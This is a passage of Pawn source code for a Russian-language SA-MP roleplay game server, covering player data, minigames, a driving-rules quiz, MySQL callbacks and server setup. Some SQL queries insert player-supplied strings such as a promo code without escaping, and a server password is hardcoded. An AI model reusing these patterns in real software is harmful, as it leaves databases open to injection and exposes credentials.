	pDCar,
	pJailTime,
	pNick[32],
	pGiri,
	pShtanga,
	pBeg,
	pMash1,
	pMash2,
	pADM,
	pVelo,
	pSkillT,
	pUdar,
	pRep,
	pSpawnChange,
	pWorkSpawn,
	pJail,
	pMask,
	pDonate,
	pHideThis,
	pApt,
	pAdmin,
	pGrabTeam,
	pGrabQuest,
	pQuestS[20],
	pOtm,
	pCrimeStats[8],
	pCRL,
	pCRC,
	pCRT,
	pPros,
	pProsFrac,
	pMuteKol,
	pAnsKol,
	pBanKol,
	pJailKol,
	pWarnKol,
	pTest,
	pFreeTime,
	pCode,
	pBizAC[5],
	pBizA[5],
	pHod,
	pDamage,
	pInGame,
	pVK,
	pVKCode,
	pVKStatus,
	pQst[10],
	pQ[3],
	pQs[10],
	pNarkObj,
	pNark,
	pUl[3],
    pGunColor[7],
    pGunColors[20],
	pKeys,
	pGunSkill[7],
	pSkills[50],
	pQuest,
	pShash,
	pShtrav,
	pShtravTick,
	pFight,
	pFam,
	pAdminC,
	pGolos,
	pGolos1,
	pPriz,
	pAcs[6],
	pMin,
	pMati,
	pMatiTick,
	pTie,
	pSmoke,
	pJob,
	pMail[50],
	pRas,
	pNumPass[20],
	pMash,
	pVoz,
	pIng,
	pModel,
	pSkin[5],
	pMuted,
	pPayDay,
	pLic[7],
	pLicTime[7],
	pHelp,
	pSpawn,
	pSex,
	pAdminPass,
	pPhone,
	pMember,
	pVip,
	pRank,
	pWork,
	pFVig,
	pGangScore,
	pLeader,
	pDateM,
	pOnlineMes,
	pHMuted,
	pDateIg,
	pDateReg,
	pExp,
	pWarn,
	pKolBan,
	pKolWarn,
	pKolDonate,
	pPhoneBal,
	pOnline,
	pMats,
	pDrugs,
	Float:pArm,
	pDateO,
	pZakon,
	pWanted,
	pWantedA,
	pSuAd[20],
	pAd,
	pObject[5],
	pObjectSp,
 Text3D:pLable[5],
	pAdText[60],
	pCash,
	pTestMoney,
	pRolik,
	pAr,
	pBank,
	pBankPin,
	pPin,
	pPin1,
	pGA,
	pIpReg[16],
	pIp[16],
	pLWarn,
	pVPos[70],
	pKan,
	pNHeal,
	pGolod,
	Float:pHeal,
	pPriglas[MAX_PLAYER_NAME],
	pSendername[MAX_PLAYER_NAME]
};
//======= casino
new Text:Box;
new Text:Digit1[6];
new Text:Digit2[6];
new Text:Digit3[6];
new Slots[MAX_PLAYERS][3];
new SlotCounter[MAX_PLAYERS];
new Gambling[MAX_PLAYERS];
new SlotTimer[MAX_PLAYERS];
new Bet[MAX_PLAYERS];
///
new bool:SpawnReg[MAX_PLAYERS];
new PlayerInfo[MAX_PLAYERS][pInfo];
new ListNick[MAX_PLAYERS][70];
new Fuel[MAX_VEHICLES];
new engine,lights,alarm,doors,bonnet,boot,objective;
new bool:AdminLogged[MAX_PLAYERS];
new query[2048];
new Text:OSN[8];
//new PlayerText:Golod[MAX_PLAYERS];
new Bar:Golod;
new ghour,gminute,gsecond;
new botcar;
//new AdminChat[MAX_PLAYERS];
new CheckF[MAX_PLAYERS];
new PlayerLogTries[MAX_PLAYERS];
//new abullet__fire2[MAX_PLAYERS];
//new abullet__fire1[MAX_PLAYERS];
new PlayerText:InfoText[MAX_PLAYERS];
new Text:PressH[3];
//new doorpd[2];
new lspd[2],lspdsp[2],lspdspveh[2];
new fbigate,fbisp;
new newsgate,newssp;
new hossp;
new wather;
new meriapark;
new fbipark;
new Text:CasinoTD[4][3],Text:Casino[22];
new Float:CarRobPos[8][4] = {
{1129.8779,-1207.9834,17.8932,268.3744}, // veh 1
{1368.3153,-1491.2450,13.2375,74.3565}, // veh 1
{1524.6132,-1461.8643,9.1906,181.1411}, // veh 1
{1996.0060,-1784.2985,13.2443,90.4606}, // veh 1
{1933.6864,-2012.7900,13.2375,179.8037}, // veh 1
{2067.2061,-2056.4297,13.2375,267.3199}, // veh 1
{2357.5383,-2027.2345,13.2873,3.4101}, // veh 1
{2810.4387,-1421.3136,15.9406,268.7151} // veh 1
};
new Float:CarRobGzPos[8][4] = {
{1040.0, -1318.0, 1240.0, -1118.0 },
{ 1326.0, -1610.5, 1526.0, -1410.5 },
{1439.0, -1503.5, 1639.0, -1303.5 },
{ 1951.0, -1883.5, 2151.0, -1683.5 },
{ 1821.0, -2117.5, 2021.0, -1917.5 },
{1946.0, -2117.5, 2146.0, -1917.5 },
{ 2269.0, -2079.5, 2469.0, -1879.5 },
{ 2695.0, -1550.5, 2895.0, -1350.5 }
};
new CarRob[8];
new CarRobIDs[3][4] = {
{475,466,419,517},
{458,496,400,405},
{560,562,558,451}
};
new CarRobGz[8];

#include <acs>
new mysql;
#include <function>
new Float:postshlag[6][10] = {
{ 907.90192, 734.86334, 10.53433,   0.00000, 89.70000, 289.99185,912.22009, 727.32233, 11.20919,205.4299},
{ 912.43231, 722.36810, 10.53433,   0.00000, 89.70000, 289.99185,913.50092, 723.99219, 11.20919,24.3554},
{ -740.95453, 2048.69019, 59.97440,   0.00000, -90.48000, 277.50995,-739.64758, 2058.21899, 60.84929,5.5761},
{ -742.31909, 2063.36670, 59.97440,   0.00000, -90.48000, 277.50995,-740.18890, 2061.74780, 60.84929,192.3534},
{ -602.18500, 650.69928, 16.49390,   0.00000,89.70000, 245.38000,-603.87134, 642.80811, 17.08361,160.3801},
{ -607.76422, 638.84479, 16.49390,   0.00000, 89.70000, 245.38000,-605.37036, 639.59491, 16.97851,339.6295}
};
new muscar[2];
static const PDD[][]  ={
{"{f7ae11}Общие положения{FFFFFF}\n"},
{"\tУчастники дорожного движения не должны создавать опасность для других участников движения.\n"},
{"\tЗапрещено оставлять на дороге предметы, создающие помехи для движения.\n\n"},
{"{f7ae11}Обязанности водителя при дорожно-транспортном происшествии{FFFFFF}\n"},
{"\tПри дорожно-транспортном происшествии водители, причастные к нему, обязаны:\n"},
{"\t- немедленно остановить транспортное средство;\n"},
{"\t- включить аварийную световую сигнализацию и выставить знак аварийной остановки;\n"},
{"\t- не перемещать предметы, имеющие отношение к происшествию.\n\n"},
{"{f7ae11}Расположение транспортных средств на проезжей части{FFFFFF}\n"},
{"\tНа дорогах с двусторонним движением запрещается выезжать на сторону дороги, предназначенную для встречного движения.\n\n"},
{"{f7ae11}Скорость движения{FFFFFF}\n"},
{"\tРазрешается движение транспортных средств:\n"},
{"\t- на межгородских трассах - не более 120 км/ч;\n"},
{"\t- в населенных пунктах - не более 70 км/ч;\n"},
{"\t- в жилых зонах и прилегающих территориях - не более 30 км/ч.\n\n"},
{"{f7ae11}Обгон{FFFFFF}\n"},
{"\tОбгонять безрельсовое транспортное средство разрешается только с левой стороны.\n"},
{"\tОбгон транспортного средства, водитель которого подал сигнал поворота налево и приступил к выполнению маневра, производится с правой стороны.\n\n"},
{"{f7ae11}Начало движения, маневрирование{FFFFFF}\n"},
{"\tПеред началом движения,\n"},
{"\tизменением направления движения (перестроение, поворот, разворот, обгон, объезд)\n"},
{"\tи остановкой водитель должен убедиться в том,\n"},
{"\tчто маневр безопасен и не создаются помехи другим участникам движения.\n\n"},
{"{f7ae11}Предупреждающие знаки{FFFFFF}\n"},
{"\tЗнак #15 - сброс скорости до 50 км/ч;\n"},
{"\tЗнак #28 - решеходный переход;\n"},
{"\tЗнак #37 - установлен радар;\n"},
{"\tЗнак #20 - ограничение скорости до 65 км/ч.\n\n"},
{"{f7ae11}Принудительные и аварийные сигналы, применение знака аварийной остановки{FFFFFF}\n"},
{"\tПредупредительными сигналами являются:\n"},
{"\t- сигналы, подаваемые мигающими указателями поворотов или рукой;\n"},
{"\t- звуковые сигналы;\n"},
{"\t- мигание фарами;\n"},
{"\t- включенные фары ближнего света в дневное время.\n\n"},
{"{f7ae11}Остановка и парковка транспортного средства{FFFFFF}\n"},
{"\tОстановка без аварийного знака запрещается в следующих местах:\n"},
{"\t- на краю тротуара;\n"},
{"\t- в тоннелях, на железнодорожных переездах;\n"},
{"\t- на опасных поворотах проезжей части.\n\n"},
{"{f7ae11}Дополнительная информация для водителя:{FFFFFF}\n"},
{"\t- чтобы завести двигатель автомобиля: 2;\n"},
{"\t- чтобы включать фары автомобиля: LEFT ALT;\n"},
{"\t- чтобы закрыть автомобиль: /LOCK.\n"},
{"\t - панель упраления /car"}
};
static const Vopros[][] = {
{3,1},
{4,4},
{3,2},
{6,3},
{4,1},
{4,2}
};

static const TextVop [][] = {
{"{f7ae11}Скорость движения в населенных пунктах - и в жилых зонах:{FFFFFF}\n\n\
\t1. 70км/ч | 30 км/ч\n\
\t2. 90км/ч | 50 км/ч\n\
\t3. 80км/ч | 60 км/ч\n"},
{"{f7ae11}В каких местах запрещено останавливаться/парковаться без аварийного знака:{FFFFFF}\n\n\
\t1. На тротуарах\n\
\t2. В тонелях и на железнодорожных переездах\n\
\t3. В поворотах проезжей части\n\
\t4. Все ответы верны"},
{"{f7ae11}С какой стороны проезжей части совершается обгон автомобиля:{FFFFFF}\n\n\
\t1. С правой стороны\n\
\t2. С левой стороны\n\
\t3. Все ответы верны\n"},
{"{f7ae11}Каждый водитель автомобиля должен:{FFFFFF}\n\n\
\t1. Пристегивать ремень безопасности\n\
\t2. Ехать как можно быстрее чтобы достигнуть своей цели\n\
\t3. Соблюдать правила безопасности и избегать аварий\n\
\t4. Варианты №1 и №2 верны\n\
\t5. Варианты №2 и №3 верны"},
{"{f7ae11}Знак №15 означает:{FFFFFF}\n\n\
\t1. Сброс скорости до 50 км/ч\n\
\t2. Пешеходный переход\n\
\t3. Установлен радар\n\
\t4. Ограничение скорости до 65 км/ч"},
{"{f7ae11}Что надо использовать для того чтобы включить фары и завести автомобиль:{FFFFFF}\n\n\
\t1. CTRL | CAPS LOCK\n\
\t2. LEFT ALT | 2 \n\
\t3. LEFT ALT | CTRL\n\
\t4. Варианты №1 и №2 Верны\n\
\t5. Варианты №2 и №3 Верны"}
};
new washcar[2];
new shlagpos[6],shlagsp[6],shlagspveh[6];
enum govi
{
 gText[144],
 gMember,
 gTime

}
new GovInfo[12][govi];

new TOTALGOV;
new Float:MeriaTop[][] = {
{1396.394653, -2.641798, 1001.203125, 0.000000, 0.000014, 270.000000},
{1396.394653, -2.641798, 1000.903137, 0.000000, 0.000014, 270.000000},
{1396.394653, -2.641798, 1000.603149, 0.000000, 0.000014, 270.000000},
{1396.394653, -2.641798, 1000.303161, 0.000000, 0.000014, 270.000000},
{1398.155883, -2.641798, 1001.203125, -0.000007, 0.000014, -89.999977},
{1398.155883, -2.641798, 1000.903137, -0.000007, 0.000014, -89.999977},
{1398.155883, -2.641798, 1000.603149, -0.000007, 0.000014, -89.999977},
{1398.155883, -2.641798, 1000.303161, -0.000007, 0.000014, -89.999977}
};
new MeriaTopObj[8];
new Float:MeriaTop1[][] = {
{ 1397.240112, -33.678932, 1001.203125, 0.000014, 0.000014, 89.999893},
{ 1397.240112, -33.678932, 1000.903137, 0.000014, 0.000014, 89.999893},
{ 1397.240112, -33.678932, 1000.603149, 0.000014, 0.000014, 89.999893},
{ 1397.240112, -33.678932, 1000.303161, 0.000014, 0.000014, 89.999893},
{1395.478881, -33.678932, 1001.203125, 0.000007, 0.000014, 89.999916},
{ 1395.478881, -33.678932, 1000.903137, 0.000007, 0.000014, 89.999916},
{ 1395.478881, -33.678932, 1000.603149, 0.000007, 0.000014, 89.999916},
{ 1395.478881, -33.678932, 1000.303161, 0.000007, 0.000014, 89.999916}
};
new MeriaTopObj1[8];
new Float:GangTop[][] = {
{2167.578857, -1517.967163, 28.920330, -0.000047, -0.000018, -112.499862},
{2167.578857, -1517.967163, 27.920330, -0.000047, -0.000018, -112.499862},
{2167.578857, -1517.967163, 26.920330, -0.000047, -0.000018, -112.499862},
{2167.578857, -1517.967163, 25.920330, -0.000047, -0.000018, -112.499862},
{2167.578857, -1517.967163, 24.920330, -0.000047, -0.000018, -112.499862}
};
new GangTopObj[5];
main()
{
	print("\n----------------------------------");
	print("UNRP ROLE PLAY BY BATKA1337 STARTED");
//	if(mysql_ping() == 1) printf(" Подключение к базе `%s` успешно", SQL_DB);
//	else printf(" Подключение к базе `%s` не успешно", SQL_DB);
	print("----------------------------------\n");
}
function ResetVse(name[],cost)
{
    if(cache_get_row_count(mysql)>0)
	{
	    new cash = cache_get_field_content_int(0, "cash", mysql);
	    SetPlayerInt(name,"cash",cash+cost);
    }
    return 1;
}

function CheckRef(playerid,ipstr[])
{
    if(cache_get_row_count(mysql)>0)
	{
	    new ip[16];
        new cash = cache_get_field_content_int(0, "cash", mysql);
        cache_get_field_content(0, "ipreg", ip, mysql);
        if(strcmp(ipstr,ip,true)) SetPlayerInt(PlayerInfo[playerid][pPriglas],"cash",cash+2500);
    }
    return 1;
}
function CheckContainer(playerid)
{
    new rows = cache_get_row_count(mysql);
    if(rows>0)
    {
        new names[24],stavka,num,str[10];
        for(new row = 1; row<= rows; row++)
		{
		    cache_get_field_content(row-1, "name", names, mysql);
		    stavka = cache_get_field_content_int(row-1, "stavka", mysql);
		    PlayerTextDrawSetString(playerid,AuctionP[playerid][num],names);
		    format(str,sizeof(str),"%d",stavka);
		    PlayerTextDrawSetString(playerid,AuctionP[playerid][num+5],str);
			num++;
		}
		if(num < 4)
		{
		    for(new i = num; i < 5; i++)
		    {
		        PlayerTextDrawSetString(playerid,AuctionP[playerid][i],"None");
		        PlayerTextDrawSetString(playerid,AuctionP[playerid][i+5],"0");
		    }
		}
    }
    else
    {
        for(new i = 0; i < 5; i++)
	    {
	        PlayerTextDrawSetString(playerid,AuctionP[playerid][i],"None");
	        PlayerTextDrawSetString(playerid,AuctionP[playerid][i+5],"0");
	    }
    }
    return 1;
}
function CheckBlackList(playerid,phone)
{
    if(cache_get_row_count(mysql)>0)
    {
        query = "";
        format(query, sizeof(query), "SELECT * FROM blacklist WHERE num = '%d' AND id1 = '%d'", phone, PlayerInfo[playerid][pID]);
		mysql_tquery(mysql, query, "CheckBlackList1", "dd", playerid,phone);
    }
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного номера телефона не зарегистрирован");
    return 1;
}
function ShowHui(bizz)
{
    if(!cache_get_row_count(mysql)) printf("ID BIZ: %d",bizz);
    return 1;
}
function CheckBlackList1(playerid,phone)
{
    if(cache_get_row_count(mysql)>0)
    {
        query = "";
		format(query, sizeof(query), "INSERT INTO phone (id1,num) VALUES ('%d','%d')", PlayerInfo[playerid][pID],phone);
		mysql_tquery(mysql,query);
		SendClientMessage(playerid,-1,"Данной номер телефона добавлен в черный список");
    }
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного номера уже есть в Вашем черном списке");
    return 1;
}
function ShowSMSDB(playerid)
{
    if(cache_get_row_count(mysql)>0)
    {
        new year, month, day, hour, minute, second,sos[24],text[60],sos1[24],time;
        time = cache_get_field_content_int(0, "time", mysql);
        TimestampToDate(time, year, month, day, hour, minute, second,0);
        cache_get_field_content(0, "id1", sos, mysql);
        cache_get_field_content(0, "id2", sos1, mysql);
        cache_get_field_content(0, "sms", text, mysql);
		static const fmt_string[] = "{ffffff}[%02d/%02d/%02d %02d:%02d:%02d] {f7ae11}%s{ffffff} %s\n\n%s";
		new str1[sizeof(fmt_string)+20];
		format(str1, sizeof(str1), fmt_string,day,month,year,hour, minute, second,(strfind(sos,PlayerInfo[playerid][pSendername],true) != -1) ? ("к") : ("от"),(strfind(sos,PlayerInfo[playerid][pSendername],true) != -1) ? (sos1) : (sos),text);
		ShowPlayerDialog(playerid,420,DIALOG_STYLE_MSGBOX,"Сообщение",str1,"Закрыть","");
    }
    return 1;
}
function CheckPromo(playerid,code[])
{
    if(cache_get_row_count(mysql)>0)
    {
		new var,vvod;
        var = cache_get_field_content_int(0, "type", mysql);
        vvod = cache_get_field_content_int(0, "vvod", mysql);
        switch(var)
		{
			case 1: ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Промокод","{ffffff}Вы успешно активировали {f7ae11}промокод!{ffffff}\n\n\
			1. С 1 по 2 уровень Вы будете получать\n\
			{f7ae11}двойной опыт.{ffffff}\n\n\
			2. Со 2 по 3 уровень будет действовать\n\
			{f7ae11}тройной опыт.{ffffff}\n\n\
			3. При достижении 3 уровня Вы получите\n\
			{f7ae11}50000${ffffff}, и прокачанные на 65% навыки\n\
			впадения {f7ae11}Deagle, M4 и Shotgun.{ffffff}","Далее","");
			case 2: ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Промокод","{ffffff}Вы успешно активировали {f7ae11}промокод!{ffffff}\n\n\
			1. При достижении 3 уровня Вы\n\
			получите {f7ae11}50000$.{ffffff}\n\n\
			2. Вам выдадут ещё {f7ae11}80000$,{ffffff} если Вы\n\
			дойдёте до 6 уровня.\n\
			3. С 6 по 9 уровень Вы будете получать\n\
			{f7ae11}двойной опыт.{ffffff}","Далее","");
			case 3: ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Промокод","{ffffff}Вы успешно активировали {f7ae11}промокод!{ffffff}\n\n\
			1. При достижении 2 уровня Вы\n\
			получите {f7ae11}40000$.{ffffff}\n\n\
			2. С 5 по 7 уровень Вы будете получать\n\
			{f7ae11}тройной опыт.{ffffff}\n\
			3. Вам выдадут ещё {f7ae11}80000$,{ffffff} если Вы\n\
			дойдёте до 9 уровня.","Далее","");

		}
		PlayerInfo[playerid][pCode] = var;
		query = "";
		format(query,sizeof(query),"UPDATE `code` SET `vvod` = '%d' WHERE code = '%s' LIMIT 1",vvod+1,code);
		mysql_tquery(mysql,query);
    }
    else
    {
        ShowPlayerDialog(playerid,412,DIALOG_STYLE_INPUT,"Промокод","{ffffff}Введите промокод:\n","Далее","Отмена");
    	return SendClientMessage(playerid,CGREY,"Неверный промокод!");
    }
	return 1;
}


function GetPrize(playerid)
{
    if(cache_get_row_count(mysql)>0) SendClientMessage(playerid,CREWARD ,"У Вас имеются не забранные призы. Используйте:{FFFFFF} » (/prizes).");
    return 1;
}
function CheckPhoneCard(playerid, phone,code[])
{
    if(cache_get_row_count(mysql)>0)
    {
        query = "";
        format(query, sizeof(query), "SELECT * FROM phone WHERE num = '%d' AND id1 = '%d'", phone, PlayerInfo[playerid][pID]);
		mysql_tquery(mysql, query, "CheckPhoneCard1", "dds", playerid, phone,code);
    }
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного номера телефона не зарегистрирован");
    return 1;
}
function CheckPhoneCard1(playerid, phone,code[])
{
    if(cache_get_row_count(mysql)>0) SendClientMessage(playerid, 0xAFAFAFAA, "Данного номера уже есть в Вашей записной книжке");
    else
    {
        query = "";
        format(query, sizeof(query), "INSERT INTO phone (id1,name,num) VALUES ('%d', '%s','%d')", PlayerInfo[playerid][pID],code,phone);
		mysql_tquery(mysql,query);
		SendClientMessage(playerid,-1,"Данной номер телефона добавлен в ваши контакты");
    }
    return 1;
}
function CheckUninvite(playerid,nick[])
{
    new lel;
    if(cache_get_row_count(mysql) >	0)
    {
        lel = cache_get_field_content_int(0, "member", mysql);
        if(lel != PlayerInfo[playerid][pMember]) return SendClientMessage(playerid,CGREY,"Игрок не в вашей фракции");
		SetPlayerInt(nick, "member", 0);
		SetPlayerInt(nick, "rank", 0);
		static const fmt_string2[] = "Вы уволили %s оффлайн";
		new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME];
		format(str2, sizeof(str2), fmt_string2,nick);

		SendClientMessage(playerid,CBLUE,str2);
    }
    else
    {
        SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
    }
    return 1;
}
function CheckSim(playerid,krek)
{
    if(cache_get_row_count(mysql)>0)
    {
        ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
		Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Данная сим-карта уже зарегистрирована");
		SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
    }
    else
    {
        if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
		else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"));
		BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),GetPVarInt(playerid,"AmmoProd"));
		//BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] -= 2;
		//BizInfo[GetPVarInt(playerid,"PBIZ")][bMoney] += GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"))/2;
		ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
		Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
		SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
		PlayerInfo[playerid][pPhone] = krek;
		SaveAccount(playerid);
		static const fmt_str[] = "Вы приобрели сим-карту. Ваш новый номер: %i";
		new str[sizeof(fmt_str)+6];
		format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pPhone]);
		SendClientMessage(playerid,CREWARD,str);

    }
    DeletePVar(playerid,"AmmoGun");
	DeletePVar(playerid,"AmmoPrice");
	return 1;
}
function CheckPhone(playerid,rand)
{
    if(cache_get_row_count(mysql) > 0)
    {
        SendClientMessage(playerid,CGREY,"Ошибка при покупке попробуйте ещё раз!");
    }
    else
    {
        if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
		else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"));
		BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),GetPVarInt(playerid,"AmmoProd"));
		ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
		Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
		SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
		if(!PlayerInfo[playerid][pPhone]) GiveInv(playerid,317,1);
		PlayerInfo[playerid][pPhone] = rand;
		SaveAccount(playerid);
		static const fmt_str[] = "Вы приобрели телефон. Ваш номер: %i";
		new str[sizeof(fmt_str)+6];
		format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pPhone]);
		SendClientMessage(playerid,CREWARD,str);
		SendClientMessage(playerid,CREWARD,"/sms - Написать SMS | /call - Позвонить");
		SendClientMessage(playerid,CREWARD,"/phone - Открыть меню телефона");
		DeletePVar(playerid,"AmmoGun");
  		DeletePVar(playerid,"AmmoPrice");
    }
    DeletePVar(playerid,"AmmoGun");
	DeletePVar(playerid,"AmmoPrice");
}
public OnGameModeInit()
{
	// Don't use these lines if it's a filterscript
	new tmpobjid;
	SetNameTagDrawDistance(15.0);
	ManualVehicleEngineAndLights();
	EnableStuntBonusForAll(0);
	ShowPlayerMarkers(0);
	DisableInteriorEnterExits();
	Streamer_SetTickRate(30);
	Streamer_VisibleItems(STREAMER_TYPE_OBJECT, 1000);
	
	mysql = mysql_connect(""SQL_HOST"", ""SQL_USER"", ""SQL_DB"", ""SQL_PASS"");

	

//	mysql_set_charset("cp1251_general_ci");
	mysql_function_query(mysql,"SET NAMES 'utf8'",false,"","");
	mysql_function_query(mysql,"SET CHARACTER SET 'cp1251'",false,"","");
	SetGameModeText("BM v.2.3");
	SendRconCommand("hostname "NAME_SERVER"");
	SendRconCommand("password 633633");
	SendRconCommand("ackslimit 100000");
	SendRconCommand("messageholelimit 100000");
	gettime(ghour,gminute,gsecond);
	SetWorldTime(ghour);
	CreateDynamicObject(19817, 2241.23, 2436.59, 9.60, 0.00, 0.00, 179.50);
	CreateDynamicObject(1567, 459.48, 1408.62, 1083.20, 0.00, 0.00, -89.79);
	// weapon config
//	SetCustomFallDamage(true);
//	SetWeaponDamage(WEAPON_DEAGLE, DAMAGE_TYPE_RANGE, 25.0, 20.0, 10.0, 60.0, 0.0);
	//
/*	CreateDynamicObject(3571, 2837.00732, -2383.54126, 12.45590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3571, 2837.00732, -2390.13257, 12.45590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3571, 2837.00732, -2396.72388, 12.45590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3571, 2837.00732, -2403.31519, 12.45590,   0.00000, 0.00000, 0.00000);




	CreateDynamicObject(2935, 2837.00732, -2414.63232, 12.45590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2935, 2837.00732, -2421.22362, 12.45590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2935, 2837.00732, -2427.81492, 12.45590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2935, 2837.00732, -2434.40622, 12.45590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2935, 2837.00732, -2440.99752, 12.45590,   0.00000, 0.00000, 90.00000);*/
	for(new i = 0; i < 6; i++)
	{
	    YachText[0][i] = CreateDynamic3DTextLabel( "-",-1,YachPos[i][0], YachPos[i][1], YachPos[i][2],3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,66,-1);
	   	YachText[1][i] = CreateDynamic3DTextLabel( "-",-1,YachPos[i][0], YachPos[i][1], YachPos[i][2],3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,2,66,-1);
	   	UpdateYach(0,i);
	   	UpdateYach(1,i);
	   	yachek[i] = CreateDynamicSphere(YachPos[i][0], YachPos[i][1], YachPos[i][2],1.0);
	}
	bankkasls = CreateDynamicSphere(2473.08,2243.6,10.8203,1.0);
	bankkaslv = CreateDynamicSphere(1485.86,-1011.7,26.8438,1.0);
	poscarls = CreateDynamicSphere(1501.9181,-1028.4258,23.4921,5.0);
	poscarlv = CreateDynamicSphere(2487.9097,2238.5088,10.4348,5.0);
	for(new i = 0; i < sizeof(CarRobPos); i++)
	{
		CarRob[i] = CreateVehicle(CarRobIDs[random(3)][random(4)],CarRobPos[i][0],CarRobPos[i][1],CarRobPos[i][2],CarRobPos[i][3],-1,-1,60);
		SetVehicleVirtualWorld(CarRob[i],18);
		CarRobGz[i] = GangZoneCreate(CarRobGzPos[i][0],CarRobGzPos[i][1],CarRobGzPos[i][2],CarRobGzPos[i][3]);
	}
	static Float:Cont[9][4] = {
		{ 2837.00732, -2383.54126, 12.45590,   0.00000},
		{ 2837.00732, -2390.13257, 12.45590,   0.00000},
		{ 2837.00732, -2396.72388, 12.45590,   0.00000},
		{ 2837.00732, -2403.31519, 12.45590,   0.00000},
		{ 2837.00732, -2414.63232, 12.45590,   90.00000},
		{ 2837.00732, -2421.22362, 12.45590,   90.00000},
		{ 2837.00732, -2427.81492, 12.45590,   90.00000},
		{ 2837.00732, -2434.40622, 12.45590,   90.00000},
		{ 2837.00732, -2440.99752, 12.45590,   90.00000}
	};
	for(new i = 0; i < 6; i++)
	{
	    Containers[i] = false;
	    MaxBet[i] = 0;
		if(i < 4) CreateDynamicObject(3571, Cont[i][0], Cont[i][1], Cont[i][2],   0.00000, 0.00000,  Cont[i][3]);
		else CreateDynamicObject(2935, Cont[i][0], Cont[i][1], Cont[i][2],   0.00000, 0.00000,  Cont[i][3]);

    	ContText[i] = CreateDynamic3DTextLabel( "{f7ae11}[Контейнеры]{ffffff}\nАукцион: {f7ae11}Остановлен",-1,Cont[i][0], Cont[i][1], Cont[i][2]+2,30.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,0,0);
	}
	CreateDynamicObjectEx(16272, 139.02757, -307.18289, 11.78170, 0.00000, 0.00000, 358.46338);
	CreateDynamicObject(1567, 235.59, 1201.96, 1079.26, 0.00, 0.00, -89.90);
	CreateDynamicObject(1567, 361.28, 1424.47, 1080.34, 0.00, 0.00, 90.39);
    CreateDynamicObject(1567, 24.88, 1419.56, 1083.43, 0.00, 0.00, 0.00);
    
	CreateDynamicObject(4639, 1108.49829, -1749.14294, 14.27410,   0.00000, 0.00000, 180.00000);
	
	PovarBot = CreateDynamicActor(153,1405.9885,-14.0857,1000.9299,92.2431,1,100.0,5,5);
	PovarText = CreateDynamic3DTextLabel( "-",0xC2C2C220,1405.9885,-14.0857,1001.9299,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID, 1,5,5);
	PovarPic = CreateDynamicPickup(1275,23,1404.3370,-14.3181,1000.9221,5,5);

    RobBot = CreateDynamicActor(50,2412.2695,-1418.9071,24.0450,127.8305,1,100.0,0,0);
    RobText = CreateDynamic3DTextLabel( "Используйте: {f7ae11}H",-1,2412.2695,-1418.9071,25.0450,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID, 1,0,0);
    
	SetWeather(13);
	NumberDrugs = random(9999);
	wather = 13;
	CreatePickup(1318,23, 0, 0, 0, 1);
	Create3DTextLabel( "-", -1,0,0,0,10.0,1, 1 );
	SetGravity(0.012);
	
	
	#include <td>

	for(new i = 0; i < sizeof(Vehicl); i++)
	{
	    FBICars[i]  = CreateVehicle(420,Vehicl[i][0],Vehicl[i][1],Vehicl[i][2],Vehicl[i][3],1,1,-1);
	    SetVehicleVirtualWorld(FBICars[i],20);
	}
